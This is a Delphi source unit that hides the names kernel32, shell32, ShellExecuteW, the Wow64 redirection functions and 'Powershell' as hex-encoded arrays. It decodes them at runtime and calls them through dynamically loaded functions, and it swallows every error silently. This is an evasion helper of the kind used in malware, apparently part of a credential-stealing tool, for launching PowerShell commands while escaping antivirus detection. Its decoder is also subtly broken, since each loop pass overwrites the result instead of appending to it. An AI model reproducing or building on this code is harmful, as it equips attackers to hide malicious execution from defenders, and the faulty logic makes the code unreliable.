unit CodeUnitPassView;

interface

uses GetLibModHandlePassView;

const
  // kernel32.dll
  HSH0:Array[0..11] of string=('6B','65','72','6E','65','6C','33','32','2E','64','6C','6C');
  // shell32.dll
  HSH1:Array[0..10] of string=('73','68','65','6C','6C','33','32','2E','64','6C','6C');
  // ShellExecuteW
  HSH2:Array[0..12] of string=('53','68','65','6C','6C','45','78','65','63','75','74','65','57');
  // Wow64DisableWow64FsRedirection
  HSH3:Array[0..29] of string=('57','6F','77','36','34','44','69','73','61','62','6C','65','57','6F','77',
  '36','34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Wow64RevertWow64FsRedirection
  HSH4:Array[0..28] of string=('57','6F','77','36','34','52','65','76','65','72','74','57','6F','77','36',
  '34','46','73','52','65','64','69','72','65','63','74','69','6F','6E');
  // Powershell
  HCOM:Array[0..9] of string=('50','6F','77','65','72','73','68','65','6C','6C');


  function HATS(const hexarr:array of string): Ansistring;
  procedure SEW(hWnd: THandle;
  Operation, FileName, Parameters, Directory: WideString;
  ShowCmd: Integer);
  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);

implementation

  function HATS(const hexarr:array of string): Ansistring;
  var
   i:Integer;
  function SToI(const S: string): Integer;
  var E: Integer;
  begin
    Val(S, Result,E);
  end;
  function HToS(hex: Ansistring): Ansistring;
  var
  i: Integer;
  begin
    for i:= 1 to Length(hex) div 2 do
    begin
      Result := Result + AnsiChar(SToI('$' +  String(Copy(hex, (i-1) * 2 + 1, 2)) ));
    end;
  end;
  begin
    for i:= 0 to Length(hexarr)-1 do
    begin
      Result :=  HToS(AnsiString(hexarr[i]));
    end;
  end;

  procedure SEW(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer);
  var
  SE: function(hWnd: THandle;
    Operation, FileName, Parameters, Directory: WideString;
    ShowCmd: Integer): HINST; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH1))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH2))));
      SE(hWnd, Operation, FileName, Parameters, Directory, ShowCmd);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW1(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH3))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

  procedure WoW2(Var Wow64FsEnableRedirection: LongBool);
  var
  SE: function(Var Wow64FsEnableRedirection: LongBool): LongBool; stdcall;
  HM:HMODULE;
  begin
    try
      HM := LoadLibrary(PChar(string(HATS(HSH0))));
      @SE := GetProcAddress(HM, PChar(string(HATS(HSH4))));
      SE(Wow64FsEnableRedirection);
      FreeLibrary(HM);
    except
    ;
    end;
  end;

end.